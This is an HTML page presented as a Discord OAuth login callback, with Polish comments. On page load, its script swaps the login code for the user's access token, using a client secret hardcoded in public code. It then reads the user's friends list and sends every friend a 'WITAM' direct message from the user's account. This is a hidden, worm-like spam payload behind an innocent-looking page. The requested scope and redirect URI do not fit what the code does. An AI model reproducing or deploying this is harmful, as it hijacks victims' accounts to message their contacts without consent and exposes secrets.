<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord Auth Callback</title>
</head>
<body>

<script>
  // Funkcja do pobierania parametrów URL
  function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
  }

  // Pobranie kodu autoryzacyjnego z parametrów URL
  var code = getParameterByName('code');

  if (code) {
    // Wymiana kodu autoryzacyjnego na token dostępu
    fetch('https://discord.com/api/oauth2/token', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: new URLSearchParams({
        client_id: '1140982123822583869',            // Zaktualizuj na swoje
        client_secret: 'Dlu2H1Y14AJ1sT5x-Ko1GX9bGvYMCQtO',    // Zaktualizuj na swoje
        grant_type: 'authorization_code',
        code: code,
        redirect_uri: 'https://discord.com/channels/1140984355066490930/1140984355066490933',      // Zaktualizuj na swoje
        scope: 'identify'                       // Zakresy, które wykorzystujesz
      })
    })
    .then(response => response.json())
    .then(data => {
      var accessToken = data.access_token;

      // Pobierz listę znajomych
      fetch('https://discord.com/api/v10/users/@me/relationships', {
        method: 'GET',
        headers: {
          'Authorization': `Bearer ${accessToken}`
        }
      })
      .then(response => response.json())
      .then(data => {
        // Wysyłanie wiadomości "WITAM" do każdego znajomego
        data.forEach(friend => {
          fetch(`https://discord.com/api/v10/users/@me/channels`, {
            method: 'POST',
            headers: {
              'Authorization': `Bearer ${accessToken}`,
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              recipients: [friend.id],
              type: 1
            })
          })
          .then(response => response.json())
          .then(data => {
            fetch(`https://discord.com/api/v10/channels/${data.id}/messages`, {
              method: 'POST',
              headers: {
                'Authorization': `Bearer ${accessToken}`,
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                content: 'WITAM'
              })
            });
          });
        });
      })
      .catch(error => {
        console.error('Błąd:', error);
      });
    })
    .catch(error => {
      console.error('Błąd:', error);
    });
  }
</script>

</body>
</html>
